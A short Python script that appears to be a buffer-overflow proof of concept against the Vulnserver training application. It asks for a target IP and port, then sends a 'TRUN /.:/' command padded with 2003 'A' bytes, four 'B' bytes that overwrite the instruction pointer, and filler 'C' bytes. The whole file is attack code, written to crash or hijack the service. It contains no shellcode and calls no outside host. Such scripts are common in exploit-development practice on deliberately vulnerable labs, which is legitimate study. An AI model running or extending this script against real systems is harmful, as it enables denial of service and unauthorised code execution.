#!/usr/bin/python3

import sys,socket
from time import sleep


print("****************Vuln_Server Vulnerability*************")
sleep(0.5)
ip_address=input("Enter the IP address:\n")
port_number=input("Enter the port number:\n")

if(len(ip_address)<=0) or (len(port_number)<=0):
    if(len(ip_address)>0) and (len(port_number)<=0):
        print("*"*30)
        print("Port number field is empty")
    elif(len(ip_address)<=0) and (len(port_number)>0):
        print("*"*30)
        print("IP Address field is empty")
    else:
        print("*"*30)
        print("Issues with the user input")
elif(len(ip_address)>0) or (len(port_number)>0):
        print("*"*30)
        buffer=b"A" * 2003 + b"B" * 4 + b"C" *(2500-4-2003) 
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect((ip_address, int(port_number)))
        s.send((b"TRUN /.:/" + buffer + b"\r\n"))
        s.close()
